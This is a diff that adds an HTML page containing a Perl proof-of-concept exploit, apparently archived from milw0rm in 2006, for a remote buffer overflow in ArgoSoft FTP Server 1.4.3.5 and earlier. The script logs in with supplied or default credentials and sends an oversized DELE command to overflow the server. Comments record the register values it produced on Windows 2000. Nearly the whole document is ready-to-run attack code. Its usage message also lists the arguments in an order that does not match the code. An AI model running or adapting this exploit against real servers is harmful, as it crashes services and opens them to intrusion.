@@ -1,0 +1,51 @@
+<html><head><title>ArGoSoft FTP Server <= 1.4.3.5 Remote Buffer Overflow PoC</title></head><pre>#!/usr/bin/perl
+
+# ---------------------------------------------------- #
+# ArgoSoftFTP.pl - PoC exploit for ArgoSoft FTP Server #
+# Jerome Athias                           	       #
+# ---------------------------------------------------- #
+
+use Net::FTP;
+
+# geting data
+$host = @ARGV[0];
+$port = @ARGV[1];
+$debug = @ARGV[2];
+$user = @ARGV[3];
+$pass = @ARGV[4];
+
+# ===========
+
+if (($host) &amp;&amp; ($port)) {
+
+# make exploit string
+$exploit_string = &quot;DELE &quot;;
+$exploit_string .= &quot;A&quot; x 2041;
+$exploit_string .= &quot;B&quot; x 4;
+$exploit_string .= &quot;C&quot; x 1026;
+
+#    On Win2K SP4 FR:
+#    EAX 42424241
+#    ECX 43434343
+#    EDX 43434342
+#    EBX 43434B73
+
+       # ===================
+
+       print &quot;Trying to connect to $host:$port\n&quot;;
+       $sock = Net::FTP-&gt;new(&quot;$host&quot;,Port =&gt; $port, TimeOut =&gt; 30, Debug=&gt; $debug) or die &quot;[-] Connection failed\n&quot;;
+       print &quot;[+] Connect OK!\n&quot;;
+       print &quot;Logging...\n&quot;;
+       if (!$user) {
+            $user = &quot;test&quot;;
+            $pass = &quot;test&quot;;
+       }
+       $sock-&gt;login($user, $pass);
+       $answer = $sock-&gt;message;
+       print &quot;Sending string...\n&quot;;
+       $sock-&gt;quot($exploit_string);
+} else {
+       print &quot;ArgoSoft FTP Server - PoC Exploit\nhttps://www.securinfos.info\n\nUsing: $0 host port username password [debug: 1 or 0]\n\n&quot;;
+}
+
+# milw0rm.com [2006-02-25]</pre></html>
